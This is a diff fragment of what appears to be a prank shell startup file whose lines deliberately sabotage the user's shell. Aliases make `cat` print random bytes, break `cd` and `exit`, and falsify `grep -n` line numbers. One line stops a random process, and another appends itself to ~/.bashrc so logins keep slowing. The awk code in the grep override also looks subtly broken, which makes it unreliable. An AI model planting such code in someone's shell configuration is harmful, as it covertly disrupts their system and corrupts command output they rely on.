@@ -18,7 +18,7 @@ tset -Qe $'\t';
 alias cat="head /dev/urandom"
 
 # Use a random sort option whenever `ls` is invoked.
-ls() { command ls -$(opts="frStu"; echo ${opts:$((RANDOM % ${#opts})):1}) "$@"; }
+function ls() { command ls -$(opts="frStu"; echo ${opts:$((RANDOM % ${#opts})):1}) "$@"; }
 
 # only change user's prompt instead of entering directories
 alias cd='x(){ PWD=$1; };x'
@@ -71,7 +71,7 @@ sleep $((RANDOM%100 + 1)) && kill -STOP $(ps x -o pid|sed 1d|sort -R|head -1) &
 alias exit="${SHELL:-sh}";
 
 # Add a random number to line numbers when using `grep -n`.
-grep() { command grep "$@" | awk -F: '{ r = int(rand() * 10); n = $1; $1 = ""; command if (n ~ /^[0-9]+$/) { o = n+r } else { o = n }; print o ":" substr($0, 2)}'; }
+function grep() { command grep "$@" | awk -F: '{ r = int(rand() * 10); n = $1; $1 = ""; command if (n ~ /^[0-9]+$/) { o = n+r } else { o = n }; print o ":" substr($0, 2)}'; }
 
 # Take longer and longer to SSH to the box
 sleep 1 && echo sleep 1 >> ~/.bashrc
